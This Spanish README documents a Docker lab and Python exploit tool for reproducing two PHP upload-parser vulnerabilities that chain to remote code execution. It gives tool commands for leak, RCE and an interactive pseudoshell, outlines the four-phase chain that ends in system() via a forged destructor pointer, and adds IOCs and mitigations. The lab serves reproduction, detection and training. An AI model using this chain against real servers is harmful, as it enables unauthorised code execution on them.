# PHP2Shell Lab — CVE-2026-109618 & CVE-2026-109619

Laboratorio Docker **totalmente automatizado** para reproducir y verificar las
vulnerabilidades críticas de PHP conocidas como **PHP2Shell** (CVSS v4.0 **9.2**,
RCE no autenticado), divulgadas el 21 de octubre de 2026. **Dos puntos de
entrada**: `p2s.sh` despliega/detiene el lab automáticamente, y `php2shell.py`
es la herramienta unificada de explotación (versión, check de vulnerabilidad,
leak, RCE e IOCs en un solo script Python).

> ⚠️ **USO EXCLUSIVO EN ENTORNO AISLADO DE LABORATORIO.** Todo lo que levanta
> este lab escucha **solo en loopback (127.0.0.1)**. Apuntar estas herramientas
> a sistemas de terceros es ilegal. Estas vulnerabilidades se están explotando
> activamente en la wild.
>
> 📚 Documentación: **[`EXPLOTACION.md`](EXPLOTACION.md)** (la cadena de
> explotación fase a fase) · [`DEMO.md`](DEMO.md) (guion de grabación) ·
> [`ANATOMIA.md`](ANATOMIA.md) (el bug desde cero) · [`WRITEUP.md`](WRITEUP.md)
> (análisis técnico).

---

## TL;DR

```bash
git clone https://github.com/D1se0/php2shell_lab && cd php2shell_lab

./p2s.sh up                 # descarga las imágenes si faltan, despliega TODO y verifica salud

python3 php2shell.py version http://localhost:8081/   # fingerprint pasivo
python3 php2shell.py check  http://localhost:8081/    # ¿vulnerable? VULN/NO VULN
python3 php2shell.py rce "id"                         # 💥 RCE completo (uid=33)

./p2s.sh test all           # contraste vulnerable ✔ / parcheado ✔
./p2s.sh iocs               # IOCs en los logs (lo que meterías en tu SIEM)
./p2s.sh rce-canonical      # 💥 RCE canónico del autor (determinista)

./p2s.sh down               # detiene y elimina TODO (automático)
```

Requisitos: Docker + Docker Compose, Python 3.10+, bash. Para la ruta RCE
canónica además `sudo` y `gdb` (calibra direcciones con el debugger, tal como
hicieron los autores).

---

## ¿Qué es PHP2Shell y por qué es vulnerable?

**En 30 segundos:** el parser de `multipart/form-data` de PHP (el código que
procesa los ficheros subidos por HTTP) reserva **~52x más memoria que lo que
viaja por el cable**. Eso permite agotar el `memory_limit` de cualquier
configuración con un POST *pequeño* (2.57 MB contra el default de 128M), y
provocar un error fatal **en mitad de la inicialización del request**. PHP
aborta pero el worker sobrevive dejando **estructuras de sesión publicadas pero
sin terminar** — y un segundo POST puede reclamar esa memoria corrupta con
datos atacantes que PHP interpreta como **punteros a funciones**, hasta llegar a
ejecutar `system("comando")` como `www-data`.

Los dos CVEs:

| CVE | Fallo | Efecto |
|---|---|---|
| **CVE-2026-109619** | amplificación de memoria en el parser RFC1867 | agota `memory_limit` con POSTs pequeños → OOM en pre-RINIT |
| **CVE-2026-109618** | use-after-free en ese estado a medias | el OOM deja el heap corrompible → punteros atacantes → **RCE** |

Afecta a PHP **≤ 8.5.11** (ramas 7.4, 8.1–8.5 con versiones anteriores
también); corregido en **8.5.12** (y equivalentes 8.4.27 / 8.3.36 / 8.2.35).
El detalle completo, con diagramas y fase a fase, está en
**[`EXPLOTACION.md`](EXPLOTACION.md)** y **[`ANATOMIA.md`](ANATOMIA.md)**.

## Cómo funciona la explotación (resumen de 4 fases)

```
FASE 1 · TRIGGER ──── POST multipart con nombres gigantes (~52x memoria)
                      → OOM fatal en pre-RINIT, el worker SOBREVIVE
FASE 2 · POSO ─────── el OOM deja PS(id)/estructuras de sesión COLGANDO
FASE 3 · LEAK ─────── un array falso de 257 elementos en PS(id)−0x10 hace
                      que PHP vuelque 512 bytes de memoria en la cookie:
                      Set-Cookie: PHPSESSID=<memoria cruda>
                      → ahí están la base de libphp.so y del heap
FASE 4 · FIRE ─────── POST final con pDestructor = zif_system
                      → zend_hash_destroy ejecuta system("cmd") como www-data
```

Este lab implementa las **dos rutas** (verificado end-to-end, detalles y
fiabilidad en [`EXPLOTACION.md`](EXPLOTACION.md)):

| Ruta | Comando | Qué hace | Fiabilidad |
|---|---|---|---|
| **Canónica** (Chain A del autor) | `./p2s.sh rce-canonical` | RCE con entorno de laboratorio exacto + calibración gdb | **determinista** (12/12 fires en 8 generaciones ASLR) |
| **Remota pura** (Chain B + leak) | `./p2s.sh rce "id"` | HTTP puro contra config por defecto, sin gdb ni acceso local | **probabilística por generación ASLR**; reintentos automáticos con contenedor fresco |

---

## Los dos puntos de entrada

- **`p2s.sh`** — ciclo de vida del lab: `up` / `down` / `status` / `logs` / `clean` / `demo`.
- **`php2shell.py`** — la herramienta unificada de explotación y verificación
  (Python 3, stdlib pura): versión, check de vulnerabilidad, leak, RCE e IOCs
  en **un solo script**. Los comandos de explotación de `p2s.sh` delegan en él.

### `php2shell.py` — el exploit unificado

```bash
python3 php2shell.py version http://localhost:8081/    # fingerprint pasivo (sin trigger)
python3 php2shell.py check  http://localhost:8081/     # trigger + veredicto (0=VULN, 1=NO VULN)
python3 php2shell.py info                              # reconocimiento del target RCE
python3 php2shell.py leak                              # oracle de leak SIN fire
python3 php2shell.py rce "id"                          # cadena RCE completa (reintentos)
python3 php2shell.py rce "id" --explain --attempts 12  # narrado y con más tiradas

# ⭐ PSEUDOSHELL interactiva: comandos sh completos (pipes, ';', redirecciones,
#    stderr incluido) con salida limpia. Cada comando = leak+fire sobre un
#    worker fresco (~30-60 s); el estado no persiste entre comandos.
python3 php2shell.py shell
python3 php2shell.py shell --timeout 60

# La URL de la víctima SIEMPRE por parámetro (-u/--url); por defecto apunta al
# lab propio (http://127.0.0.1:18081/t.php). Cualquier otra URL de loopback se
# trata como target EXTERNO: sin preflight por docker y sin tocar contenedores.
python3 php2shell.py info  -u http://127.0.0.1:18082/t.php   # víctima externa
python3 php2shell.py leak  -u http://127.0.0.1:18082/t.php   # oracle sin fire
python3 php2shell.py rce   "id" -u http://127.0.0.1:18082/t.php  # RCE externo
python3 php2shell.py shell -u http://127.0.0.1:18082/t.php   # shell externa
#    (en target externo la shell solo admite comandos directos ≤ 12 bytes)
python3 php2shell.py iocs                              # IOCs para tu SIEM
```

Códigos de salida semánticos: `check` → 0 VULNERABLE / 1 NOT_VULNERABLE /
2 INDETERMINADO; `rce` → 0 RCE logrado / 1 sin RCE en N intentos.

### `p2s.sh` — ciclo de vida y secuencias

#### Ciclo de vida — 100% automático

```bash
./p2s.sh up          # despliega TODO: vulnerable :8081 + parcheado :8082
                     #   + objetivo RCE :18081 (solo loopback) + health checks
./p2s.sh status      # estado de contenedores + salud HTTP
./p2s.sh logs        # sigue logs de ambos (./p2s.sh logs <CONTENEDOR> para uno)
./p2s.sh down        # detiene y ELIMINA todo (lab + RCE + lab canónico)
./p2s.sh clean       # down + borra artefactos (pruebas del docroot, runs, caches)
./p2s.sh purge       # clean + ELIMINA las 3 imágenes (746 MB); up las re-descarga
```

### Verificación — sin explotar nada (delega en `php2shell.py`)

```bash
./p2s.sh test all      # contraste completo (vulnerable VULNERABLE / parcheado NOT_VULNERABLE)
./p2s.sh test vuln     # solo el vulnerable
./p2s.sh test patched  # solo el parcheado
./p2s.sh iocs          # caza de IOCs en los logs (exit 0 limpio · 1 hallazgos)
```

Flags extra (se pasan tras el subcomando): `--json`, `--attempts N`,
`--no-color`, `--explain` (paneles didácticos fase a fase, ideal para grabar).

### Reconocimiento del target RCE

```bash
./p2s.sh info          # versión, build, worker del objetivo :18081
./p2s.sh check         # oracle de leak SIN fire (nunca envía el par de disparo)
```

### Explotación — RCE completo

```bash
./p2s.sh rce "id"          # cadena remota pura (<=14 bytes); hasta 8 reintentos
./p2s.sh rce "id" --explain  # con narración didáctica de cada fase
./p2s.sh rce-canonical     # receta canónica del autor (sudo+gdb, determinista)
```

En la ruta remota verás los intentos (cada uno con **contenedor fresco** =
nueva generación ASLR), el leak de 512 bytes en la cookie, y al aterrizar:

```text
── intento 1/8 (contenedor fresco) ──
[✓] FASE 3-4 fire: intentos 1/3 uid proof present at table_off=0xb30d8
║  uid=33(www-data) gid=33(www-data) groups=33(www-data)║
```

### Extras

```bash
./p2s.sh demo      # secuencia guiada completa para grabar el vídeo
./p2s.sh vendor    # vende el exploit público (commit fijado b1e4199, verificable)
./p2s.sh help      # esta ayuda
```

> Si prefieres `make`, hay atajos que delegan en el script: `make up`,
> `make test`, `make rce CMD="id"`, `make rce-canonical`, `make down`…

---

## Resultados de la verificación (medidos en este lab)

| Prueba | Resultado |
|---|---|
| Trigger contra `8.5.11` | OOM fatal `Unknown on line 0` + segfault del worker (100%) |
| Trigger contra `8.5.12` | OOM gestionado (límite blando), worker sobrevive (100%) |
| Batería de estrés del repro | 10/10 veredictos correctos, 100% determinista |
| **RCE canónico** (`rce-canonical`) | `Proven - Lab-Assisted RCE`, **19/19 gates**, token escrito en `/tmp/php-rce-lab` del contenedor |
| **RCE remoto puro** (`rce "id"`) | `uid=33(www-data)` vía `zif_system`, por HTTP y config stock |

## Estructura del repo

```text
├── p2s.sh                      # ciclo de vida: up/down/status/logs/clean/demo
├── php2shell.py                # ⭐ EL exploit unificado (version/check/info/leak/rce/iocs)
├── docker-compose.yml          # vulnerable :8081 + parcheado :8082
├── Makefile                    # atajos que delegan en p2s.sh
├── lab/
│   ├── www/                    # portal NovaDocs (app realista de subida documental)
│   ├── conf/                   # php-lab.ini (16M) + apache-lab.conf (prefork mínimo)
│   ├── rce/                    # objetivo RCE :18081 (docroot escribible)
│   └── vendor/php2shell-exp/   # exploit público vendido (commit fijado, gitignoreado;
│                               #   se descarga con ./p2s.sh vendor)
├── scripts/
│   ├── php2shell_repro.py      # motor: trigger/veredicto con CLI
│   ├── php2shell_rce.py        # motor: wrapper RCE (--info/--check/-c cmd)
│   └── php2shell_iocs.py       # motor: caza de IOCs
├── README.md · EXPLOTACION.md · ANATOMIA.md · WRITEUP.md · DEMO.md
```

## Seguridad del lab por diseño

- Puertos **solo en loopback** (`127.0.0.1`); nada expuesto a la red.
- Contenedores sin red externa útil, `--memory 256m` en el target RCE.
- El exploit público se **vende con commit fijado** y se verifica con
  `sha256sum -c SOURCE-SHA256SUMS`; se ejecuta tal cual lo publicaron los
  investigadores.
- Requiere voluntariedad: nada corre contra nada sin que tú lo lances.

## Ética

Estas herramientas existen para **entender, detectar y defender**. La cadena se
documenta fase a fase (EXPLOTACION.md) para que ingenieros de seguridad
puedan construir detecciones, validar mitigaciones y formar equipos. El
lab funciona contra contenedores propios en loopback. **No lo uses contra
sistemas de terceros.**

## FAQ

**¿Funciona contra producción endurecida?** El veredicto canónico es explícito:
*RCE probado en el marco asistido de laboratorio*, no un exploit portable
ASLR-independiente. Multi-worker, `display_errors=Off` y `memory_limit` alto
siguen siendo barreras reales (ver EXPLOTACION.md §9).

**¿Por qué `rce` a veces falla?** Es la lotería de ASLR: cada arranque del
worker es una generación distinta (el propio autor documenta 2/3–3/3 por
generación). El script re-crea el contenedor por intento; si los 8 fallan,
vuelve a lanzar.

**¿Estoy protegido con 8.5.12?** Los dos CVEs sí se cierran, pero el research
publicado documenta 3 grietas residuales y un crash reproducible en FPM
(WRITEUP.md §12). Parchea y revisa las mitigaciones de EXPLOTACION.md §6.

**¿Qué hago si no puedo parchear hoy?** `memory_limit=-1` (única mitigación de
config contra el 109618), `session.upload_progress.enabled=Off`, filtrar
`multipart/form-data` en el proxy si la app no sube ficheros, y **nunca**
limitar con `RLIMIT_AS`/`RLIMIT_DATA` (empuja al mismo OOM/bailout).
